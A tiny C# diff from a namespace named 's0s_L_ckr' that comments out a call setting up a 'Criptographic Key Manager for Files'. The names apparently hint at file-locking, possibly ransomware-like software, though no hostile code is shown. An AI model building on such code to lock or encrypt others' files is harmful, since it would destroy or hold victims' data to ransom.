@@ -30,7 +30,7 @@ namespace s0s_L_ckr
 #endif
 
             // Criptographic Key Manager for Files
-            CriptoKeyMgr.EnsrLocPubKey();
+            //CriptoKeyMgr.EnsrLocPubKey();
 
             int resultVal = -1;
             ThreadStart threadStart = null;
